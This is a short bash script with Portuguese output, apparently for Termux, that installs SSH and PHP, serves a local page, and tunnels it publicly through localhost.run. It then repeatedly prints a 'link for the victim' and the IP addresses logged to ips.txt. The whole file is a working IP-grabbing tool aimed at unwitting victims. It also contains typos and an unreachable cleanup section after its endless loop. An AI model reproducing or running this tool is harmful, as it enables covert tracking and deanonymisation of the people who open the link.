#!/bin/bash

if ! [[ -f ".okay" ]]; then
  pkg="apt-get"
  [[ "${HOME}" == "/data/data/com.termux/files/home" ]] && pkg="pkg"
  printf " $ Instalando SSH\n"
  [[ -z "$(command -v openssh)" ]] && "${pkg}" i -y openssh &>/dev/null
  printf " $ Instlando PHP\n"
  [[ -z "$(command -v php)" ]] && "${pkg}" i -y php &>/dev/null
  > .okay
fi
>> ips.txt
php -S localhost:8181 &> /dev/null &
ssh -R 80:localhost:8181 nokey@localhost.run &> a.txt &
sleep 10
while :; do
  printf "\ec\n  \e[1;34mLink para a vitima:\e[0;32m$(sed 's/,/\n/g' a.txt | grep ' h' | grep '.li')\n  \e[1;34mSeu localHost:\e[0;32m http://localhost:8181\n\n"
  cat ips.txt
  sleep 10	
done
> ips.txt
kiill php
